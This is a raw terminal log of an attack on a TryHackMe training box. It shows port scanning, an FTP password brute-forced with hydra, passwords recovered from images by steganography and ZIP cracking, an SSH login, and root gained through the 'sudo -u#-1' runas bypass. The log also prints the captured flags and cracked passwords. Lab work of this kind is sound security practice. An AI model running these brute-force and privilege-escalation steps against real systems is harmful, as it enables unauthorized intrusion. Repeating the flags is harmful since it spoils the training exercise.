@@ -1,0 +1,674 @@
+┌──(root㉿kali)-[~]
+└─# nmap 10.10.30.60
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:28 UTC
+Nmap scan report for ip-10-10-30-60.eu-west-1.compute.internal (10.10.30.60)
+Host is up (0.0099s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 02:7D:7D:2E:CB:DF (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.30.60 ftp
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-17 13:48:01
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://10.10.30.60:21/
+[21][ftp] host: 10.10.30.60   login: chris   password: crystal
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-17 13:49:10
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# ftp 10.10.30.60
+Connected to 10.10.30.60.
+220 (vsFTPd 3.0.3)
+Name (10.10.30.60:root): chris
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||33705|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+226 Directory send OK.
+ftp> get To_agentJ.txt
+local: To_agentJ.txt remote: To_agentJ.txt
+229 Entering Extended Passive Mode (|||52442|)
+150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
+100% |****************************************|   217       38.57 KiB/s    00:00 ETA
+226 Transfer complete.
+217 bytes received in 00:00 (34.90 KiB/s)
+ftp> get cute-alien.jpg
+local: cute-alien.jpg remote: cute-alien.jpg
+229 Entering Extended Passive Mode (|||20763|)
+150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
+100% |****************************************| 33143       31.60 MiB/s    00:00 ETA
+226 Transfer complete.
+33143 bytes received in 00:00 (21.99 MiB/s)
+ftp> get cutie.png
+local: cutie.png remote: cutie.png
+229 Entering Extended Passive Mode (|||51724|)
+150 Opening BINARY mode data connection for cutie.png (34842 bytes).
+100% |****************************************| 34842       33.90 MiB/s    00:00 ETA
+226 Transfer complete.
+34842 bytes received in 00:00 (21.67 MiB/s)
+ftp> quit
+221 Goodbye.
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# ls
+Desktop    Downloads  Pictures  Templates      Videos          cutie.png
+Documents  Music      Public    To_agentJ.txt  cute-alien.jpg
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# cat To_agent.txt
+cat: To_agent.txt: No such file or directory
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# cat To_agentJ.txt
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# binwalk cutie.png
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# binwalk cutie.png -e
+
+Extractor Exception: Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=root' (binwalk itself must be run as root).
+----------------------------------------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/binwalk/core/module.py", line 258, in __init__
+    self.load()
+  File "/usr/lib/python3/dist-packages/binwalk/modules/extractor.py", line 147, in load
+    raise ModuleException("Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=%s' (binwalk itself must be run as root)." % user_info.pw_name)
+binwalk.core.exceptions.ModuleException: Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=root' (binwalk itself must be run as root).
+----------------------------------------------------------------------------------------------------
+
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# ls
+Desktop    Downloads  Pictures  Templates      Videos          cutie.png
+Documents  Music      Public    To_agentJ.txt  cute-alien.jpg
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# binwalk -e cutie.png
+
+Extractor Exception: Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=root' (binwalk itself must be run as root).
+----------------------------------------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/binwalk/core/module.py", line 258, in __init__
+    self.load()
+  File "/usr/lib/python3/dist-packages/binwalk/modules/extractor.py", line 147, in load
+    raise ModuleException("Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=%s' (binwalk itself must be run as root)." % user_info.pw_name)
+binwalk.core.exceptions.ModuleException: Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=root' (binwalk itself must be run as root).
+----------------------------------------------------------------------------------------------------
+
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# ls
+Desktop    Downloads  Pictures  Templates      Videos          cutie.png
+Documents  Music      Public    To_agentJ.txt  cute-alien.jpg
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# binwalk cutie.png   
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# binwalk cutie.png -e
+
+Extractor Exception: Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=root' (binwalk itself must be run as root).
+----------------------------------------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/binwalk/core/module.py", line 258, in __init__
+    self.load()
+  File "/usr/lib/python3/dist-packages/binwalk/modules/extractor.py", line 147, in load
+    raise ModuleException("Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=%s' (binwalk itself must be run as root)." % user_info.pw_name)
+binwalk.core.exceptions.ModuleException: Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=root' (binwalk itself must be run as root).
+----------------------------------------------------------------------------------------------------
+
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# binwalk cutie.png --e
+usage: binwalk [-Y] [-T MINSN] [-k] [-e] [-D DD] [-M] [-d DEPTH] [-C DIRECTORY]
+               [-j SIZE] [-n COUNT] [-0 RUN-AS] [-1] [-r] [-z] [-V] [-l LENGTH]
+               [-o OFFSET] [-O BASE] [-K BLOCK] [-g SWAP] [-f LOG] [-c] [-t] [-q]
+               [-v] [-h] [-a FINCLUDE] [-p FEXCLUDE] [-s STATUS] [--string] [-W]
+               [-G] [-i] [-U] [-u] [-w] [-X] [-Z] [-P] [-S] [-B] [-R RAW] [-A]
+               [-m MAGIC] [-b] [-I] [-x EXCLUDE] [-y INCLUDE] [-E] [-F] [-J] [-Q]
+               [-N] [-H HIGH] [-L LOW]
+binwalk: error: ambiguous option: --e could match --extract, --exclude, --entropy
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# binwalk cutie.png -extract
+
+Extractor Exception: Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=root' (binwalk itself must be run as root).
+----------------------------------------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/binwalk/core/module.py", line 258, in __init__
+    self.load()
+  File "/usr/lib/python3/dist-packages/binwalk/modules/extractor.py", line 147, in load
+    raise ModuleException("Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=%s' (binwalk itself must be run as root)." % user_info.pw_name)
+binwalk.core.exceptions.ModuleException: Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=root' (binwalk itself must be run as root).
+----------------------------------------------------------------------------------------------------
+
+                                                                                     
+┌──(root㉿kali)-[~]
+└─# fakeroot binwalk -e cutie.png
+
+Extractor Exception: Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=root' (binwalk itself must be run as root).
+----------------------------------------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/binwalk/core/module.py", line 258, in __init__
+    self.load()
+  File "/usr/lib/python3/dist-packages/binwalk/modules/extractor.py", line 147, in load
+    raise ModuleException("Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=%s' (binwalk itself must be run as root)." % user_info.pw_name)
+binwalk.core.exceptions.ModuleException: Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=root' (binwalk itself must be run as root).
+----------------------------------------------------------------------------------------------------
+
+                                                                                         
+┌──(root㉿kali)-[~]
+└─# binwalk cutie.png -extract   
+
+Extractor Exception: Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=root' (binwalk itself must be run as root).
+----------------------------------------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/binwalk/core/module.py", line 258, in __init__
+    self.load()
+  File "/usr/lib/python3/dist-packages/binwalk/modules/extractor.py", line 147, in load
+    raise ModuleException("Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=%s' (binwalk itself must be run as root)." % user_info.pw_name)
+binwalk.core.exceptions.ModuleException: Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=root' (binwalk itself must be run as root).
+----------------------------------------------------------------------------------------------------
+
+                                                                                         
+┌──(root㉿kali)-[~]
+└─# binwalk cutie.png            
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+
+                                                                                         
+┌──(root㉿kali)-[~]
+└─# binwalk cutie.png -e --run-as=root
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+
+                                                                                         
+┌──(root㉿kali)-[~]
+└─# ls
+Desktop    Downloads  Pictures  Templates      Videos                cute-alien.jpg
+Documents  Music      Public    To_agentJ.txt  _cutie.png.extracted  cutie.png
+                                                                                         
+┌──(root㉿kali)-[~]
+└─# cd _cutie.png.extracted
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# ls
+365  365.zlib  8702.zip  To_agentR.txt
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# zip2john 8702.zip > output.txt
+Command 'zip2john' is available in the following places
+ * /sbin/zip2john
+ * /usr/sbin/zip2john
+The command could not be located because '/sbin:/usr/sbin' is not included in the PATH environment variable.
+This is most likely caused by the lack of administrative privileges associated with your user account.
+zip2john: command not found
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# zip2john 8702.zip > output.hash
+Command 'zip2john' is available in the following places
+ * /sbin/zip2john
+ * /usr/sbin/zip2john
+The command could not be located because '/usr/sbin:/sbin' is not included in the PATH environment variable.
+This is most likely caused by the lack of administrative privileges associated with your user account.
+zip2john: command not found
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# git clone https://github.com/openwall/john -b bleeding-jumbo john
+cd john/src/
+./configure
+make -s clean && make -sj4
+Cloning into 'john'...
+remote: Enumerating objects: 96752, done.
+remote: Counting objects: 100% (259/259), done.
+remote: Compressing objects: 100% (131/131), done.
+remote: Total 96752 (delta 135), reused 196 (delta 128), pack-reused 96493
+Receiving objects: 100% (96752/96752), 127.35 MiB | 15.83 MiB/s, done.
+Resolving deltas: 100% (75981/75981), done.
+Updating files: 100% (2016/2016), done.
+checking build system type... x86_64-unknown-linux-gnu
+checking host system type... x86_64-unknown-linux-gnu
+checking whether to compile using MPI... no
+checking for gcc... gcc
+checking whether the C compiler works... yes
+checking for C compiler default output file name... a.out
+checking for suffix of executables... 
+checking whether we are cross compiling... no
+checking for suffix of object files... o
+checking whether we are using the GNU C compiler... yes
+checking whether gcc accepts -g... yes
+checking for gcc option to accept ISO C89... none needed
+checking whether gcc understands -c and -o together... yes
+checking whether we are using the GNU C compiler... (cached) yes
+checking whether gcc accepts -g... (cached) yes
+checking for gcc option to accept ISO C89... (cached) none needed
+checking whether gcc understands -c and -o together... (cached) yes
+checking additional paths...  -L/usr/local/lib -I/usr/local/include
+checking arg check macro for -m with gcc... yes
+checking arg check macro for -Q with gcc... yes
+checking if gcc supports -funroll-loops... yes
+checking if gcc supports -Os... yes
+checking if gcc supports -finline-functions... yes
+checking if gcc supports -Og... yes
+checking if gcc supports -Wall... yes
+checking if gcc supports -Wno-stringop-truncation... yes
+checking if gcc supports -Wno-format-overflow... yes
+checking if gcc supports -Wno-format-truncation... yes
+checking if gcc supports -Wno-tautological-constant-out-of-range-compare... no
+checking if gcc supports -fno-omit-frame-pointer... yes
+checking if gcc supports --param allow-store-data-races=0... no
+checking if gcc supports -Wno-deprecated-declarations... yes
+checking if gcc supports -Wformat-extra-args... no
+checking if gcc supports -Wunused-but-set-variable... yes
+checking if gcc supports -Qunused-arguments... no
+checking if gcc supports -std=gnu89... yes
+checking if gcc supports -Wdate-time... yes
+checking if gcc supports -m64... skipped
+checking for 32/64 bit... 64-bit
+checking additional paths (64 bit)...  -L/usr/lib64 -L/lib64
+checking whether ln -s works... yes
+checking for grep that handles long lines and -e... /usr/bin/grep
+checking for a sed that does not truncate output... /usr/bin/sed
+checking for GNU make... make
+checking whether make sets $(MAKE)... yes
+checking how to run the C preprocessor... gcc -E
+checking for a thread-safe mkdir -p... /usr/bin/mkdir -p
+checking for sort... /usr/bin/sort
+checking for find... /usr/bin/find
+checking for perl... /usr/bin/perl
+checking for ar... /usr/bin/ar
+checking for strip... strip
+checking for strings... strings
+checking for pkg-config... /usr/bin/pkg-config
+checking pkg-config is at least version 0.9.0... yes
+checking if pkg-config will be used... no
+checking for egrep... /usr/bin/grep -E
+checking for ANSI C header files... yes
+checking for sys/types.h... yes
+checking for sys/stat.h... yes
+checking for stdlib.h... yes
+checking for string.h... yes
+checking for memory.h... yes
+checking for strings.h... yes
+checking for inttypes.h... yes
+checking for stdint.h... yes
+checking for unistd.h... yes
+checking size of short... 2
+checking size of int... 4
+checking size of long... 8
+checking size of long long... 8
+checking size of wchar_t... 4
+checking size of int *... 8
+checking size of void *... 8
+checking for extra ASFLAGS... None needed
+checking for X32 ABI... no
+checking special compiler flags... Intel x86
+configure: Testing build host's native CPU features
+checking for MMX... yes
+checking for SSE2... yes
+checking for SSSE3... yes
+checking for SSE4.1... yes
+checking for SSE4.2... yes
+checking for AVX... yes
+checking for XOP... no
+checking for AVX2... yes
+checking for AVX512F... no
+checking for arch.h alternative... x86-64.h
+checking for byte ordering according to target triple... little
+checking supplied paths for OpenSSL...  
+checking additional paths for OpenSSL... none
+checking openssl/opensslv.h usability... no
+checking openssl/opensslv.h presence... no
+checking for openssl/opensslv.h... no
+configure: error: in `/root/_cutie.png.extracted/john/src':
+configure: error: OpenSSL headers not found, install them or use --without-openssl option
+See `config.log' for more details
+make: *** No rule to make target 'clean'.  Stop.
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted/john/src]
+└─# zip2john 8702.zip > output.hash                                  
+Command 'zip2john' is available in the following places
+ * /sbin/zip2john
+ * /usr/sbin/zip2john
+The command could not be located because '/usr/sbin:/sbin' is not included in the PATH environment variable.
+This is most likely caused by the lack of administrative privileges associated with your user account.
+zip2john: command not found
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted/john/src]
+└─# export $PATH='usr/sbin:/sbin'
+export: not valid in this context: /usr/bin:/bin
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted/john/src]
+└─# export $PATH=$PATH:usr/sbin:/sbin 
+export: not valid in this context: /usr/bin:/bin
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted/john/src]
+└─# export $PATH=usr/sbin:/sbin      
+export: not valid in this context: /usr/bin:/bin
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted/john/src]
+└─# export PATH=usr/sbin:/sbin 
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted/john/src]
+└─# zip2john 8702.zip > output.hash                                  
+Created directory: /root/.john
+! 8702.zip : No such file or directory
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted/john/src]
+└─# cd ..                  
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted/john]
+└─# cd ..
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# zip2john 8702.zip > output.hash
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# ls
+Command 'ls' is available in the following places
+ * /bin/ls
+ * /usr/bin/ls
+The command could not be located because '/usr/bin:/bin' is not included in the PATH environment variable.
+ls: command not found
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# echo $PATH                
+usr/sbin:/sbin
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# export PATH=usr/bin:/bin      
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# ls                      
+365  365.zlib  8702.zip  To_agentR.txt  john  output.hash  output.txt
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# cat output.txt   
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# john output.txt
+Command 'john' is available in the following places
+ * /sbin/john
+ * /usr/sbin/john
+The command could not be located because '/usr/sbin:/sbin' is not included in the PATH environment variable.
+This is most likely caused by the lack of administrative privileges associated with your user account.
+john: command not found
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# john output.hash
+Command 'john' is available in the following places
+ * /sbin/john
+ * /usr/sbin/john
+The command could not be located because '/sbin:/usr/sbin' is not included in the PATH environment variable.
+This is most likely caused by the lack of administrative privileges associated with your user account.
+john: command not found
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# export PATH=/sbin:/usr/sbin
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# john output.hash           
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
+Cost 1 (HMAC size) is 78 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+alien            (8702.zip/To_agentR.txt)     
+1g 0:00:00:01 DONE 2/3 (2023-05-17 14:12) 0.7518g/s 33416p/s 33416c/s 33416C/s 123456..Peter
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# 7z x 8702.zip
+Command '7z' is available in the following places
+ * /bin/7z
+ * /usr/bin/7z
+The command could not be located because '/usr/bin:/bin' is not included in the PATH environment variable.
+7z: command not found
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# export PATH=/usr/bin:/bin  
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# 7z x 8702.zip            
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz (306F2),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 280 bytes (1 KiB)
+
+Extracting archive: 8702.zip
+--
+Path = 8702.zip
+Type = zip
+Physical Size = 280
+
+    
+Would you like to replace the existing file:
+  Path:     ./To_agentR.txt
+  Size:     0 bytes
+  Modified: 2019-10-29 12:29:11
+with the file from archive:
+  Path:     To_agentR.txt
+  Size:     86 bytes (1 KiB)
+  Modified: 2019-10-29 12:29:11
+? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y
+
+                    
+Enter password (will not be echoed):
+Everything is Ok    
+
+Size:       86
+Compressed: 280
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# ls
+365  365.zlib  8702.zip  To_agentR.txt  john  output.hash  output.txt
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# cat To_agentR.txt
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# steghide extract -sf cute-alien.jpg
+Command 'steghide' not found, but can be installed with:
+apt install steghide
+Do you want to install it? (N/y)y
+apt install steghide
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+The following packages were automatically installed and are no longer required:
+  aspnetcore-runtime-3.1 aspnetcore-targeting-pack-3.1 dotnet-apphost-pack-3.1
+  dotnet-hostfxr-3.1 dotnet-runtime-3.1 dotnet-runtime-deps-3.1 dotnet-sdk-3.1
+  dotnet-targeting-pack-3.1 libatk1.0-data libexporter-tiny-perl libfmt8
+  libhttp-server-simple-perl liblist-moreutils-perl liblist-moreutils-xs-perl
+  libpoppler118 libwireshark15 libwiretap12 libwsutil13 python3-dataclasses-json
+  python3-limiter python3-mypy-extensions python3-ntp python3-responses python3-spyse
+  python3-token-bucket python3-typing-inspect
+Use 'apt autoremove' to remove them.
+The following additional packages will be installed:
+  libmcrypt4 libmhash2
+Suggested packages:
+  libmcrypt-dev mcrypt
+The following NEW packages will be installed:
+  libmcrypt4 libmhash2 steghide
+0 upgraded, 3 newly installed, 0 to remove and 5 not upgraded.
+Need to get 311 kB of archives.
+After this operation, 907 kB of additional disk space will be used.
+Do you want to continue? [Y/n] y
+Get:1 http://kali.download/kali kali-rolling/main amd64 libmcrypt4 amd64 2.5.8-7 [72.6 kB]
+Get:2 http://kali.download/kali kali-rolling/main amd64 libmhash2 amd64 0.9.9.9-9 [94.2 kB]
+Get:3 http://kali.download/kali kali-rolling/main amd64 steghide amd64 0.5.1-15 [144 kB]
+Fetched 311 kB in 0s (4063 kB/s)   
+Selecting previously unselected package libmcrypt4.
+(Reading database ... 467333 files and directories currently installed.)
+Preparing to unpack .../libmcrypt4_2.5.8-7_amd64.deb ...
+Unpacking libmcrypt4 (2.5.8-7) ...
+Selecting previously unselected package libmhash2:amd64.
+Preparing to unpack .../libmhash2_0.9.9.9-9_amd64.deb ...
+Unpacking libmhash2:amd64 (0.9.9.9-9) ...
+Selecting previously unselected package steghide.
+Preparing to unpack .../steghide_0.5.1-15_amd64.deb ...
+Unpacking steghide (0.5.1-15) ...
+Setting up libmhash2:amd64 (0.9.9.9-9) ...
+Setting up libmcrypt4 (2.5.8-7) ...
+Setting up steghide (0.5.1-15) ...
+Processing triggers for libc-bin (2.35-3) ...
+Processing triggers for man-db (2.11.0-1+b1) ...
+Processing triggers for kali-menu (2022.4.1) ...
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# steghide extract -sf cute-alien.jpg
+Enter passphrase: 
+steghide: could not open the file "cute-alien.jpg".
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# ls
+365  365.zlib  8702.zip  To_agentR.txt  john  output.hash  output.txt
+                                                                                         
+┌──(root㉿kali)-[~/_cutie.png.extracted]
+└─# cd ..            
+                                                                                         
+┌──(root㉿kali)-[~]
+└─# ls
+Desktop    Downloads  Pictures  Templates      Videos                cute-alien.jpg
+Documents  Music      Public    To_agentJ.txt  _cutie.png.extracted  cutie.png
+                                                                                         
+┌──(root㉿kali)-[~]
+└─# steghide extract -sf cute-alien.jpg
+Enter passphrase: 
+wrote extracted data to "message.txt".
+                                                                                         
+┌──(root㉿kali)-[~]
+└─# ls
+Desktop    Music     Templates      _cutie.png.extracted  message.txt
+Documents  Pictures  To_agentJ.txt  cute-alien.jpg
+Downloads  Public    Videos         cutie.png
+                                                                                         
+┌──(root㉿kali)-[~]
+└─# cat message.txt  
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+                                                                                         
+┌──(root㉿kali)-[~]
+└─# ssh james@10.10.30.60              
+The authenticity of host '10.10.30.60 (10.10.30.60)' can't be established.
+ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.30.60' (ED25519) to the list of known hosts.
+james@10.10.30.60's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed May 17 14:25:17 UTC 2023
+
+  System load:  0.0               Processes:           94
+  Usage of /:   39.7% of 9.78GB   Users logged in:     0
+  Memory usage: 16%               IP address for eth0: 10.10.30.60
+  Swap usage:   0%
+
+
+75 packages can be updated.
+33 updates are security updates.
+
+
+Last login: Tue Oct 29 14:26:27 2019
+james@agent-sudo:~$ ls
+Alien_autospy.jpg  user_flag.txt
+james@agent-sudo:~$ cat user_flag.txt
+b03d975e8c92a7c04146cfa7a5a313c7
+james@agent-sudo:~$ sudo -l
+[sudo] password for james: 
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+james@agent-sudo:~$ sudo -u#-1 /bin/bash
+root@agent-sudo:~# ;s
+bash: syntax error near unexpected token `;'
+root@agent-sudo:~# ls
+Alien_autospy.jpg  user_flag.txt
+root@agent-sudo:~# cd /root
+root@agent-sudo:/root# ls
+root.txt
+root@agent-sudo:/root# cat root.txt
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
+
